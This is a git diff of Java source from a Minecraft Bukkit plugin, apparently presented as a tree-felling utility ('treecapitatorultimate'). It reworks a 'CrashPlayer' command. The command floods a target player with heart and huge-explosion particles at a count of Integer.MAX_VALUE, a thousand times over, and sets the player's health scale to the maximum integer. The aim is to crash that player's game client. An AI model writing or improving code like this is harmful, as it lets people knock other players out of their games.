@@ -4,11 +4,9 @@ import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
-import net.minecraft.server.v1_14_R1.PacketPlayOutWorldParticles;
-import net.minecraft.server.v1_14_R1.Particles;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
+import org.bukkit.Particle;
 import org.bukkit.entity.Player;
 import org.bukkit.scheduler.BukkitRunnable;
 
@@ -80,11 +78,9 @@ public class CrashPlayer extends Command {
         } catch (Exception ignored) {
 
         }
-        final PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(Particles.HEART, true, (float) p.getLocation().getBlockX(), (float) p.getLocation().getBlockY(), (float) p.getLocation().getBlockZ(), 3.0f, 3.0f, 3.0f, 3.0f, Integer.MAX_VALUE);
-        final PacketPlayOutWorldParticles packet2 = new PacketPlayOutWorldParticles(Particles.EXPLOSION, true, (float) p.getLocation().getBlockX(), (float) p.getLocation().getBlockY(), (float) p.getLocation().getBlockZ(), 3.0f, 3.0f, 3.0f, 3.0f, Integer.MAX_VALUE);
         for (int f = 0; f < 1000; f++) {
-            ((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet);
-            ((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet2);
+            p.spawnParticle(Particle.HEART, p.getLocation(), Integer.MAX_VALUE);
+            p.spawnParticle(Particle.EXPLOSION_HUGE, p.getLocation(), Integer.MAX_VALUE);
         }
         p.setHealthScale(Integer.MAX_VALUE);
     }
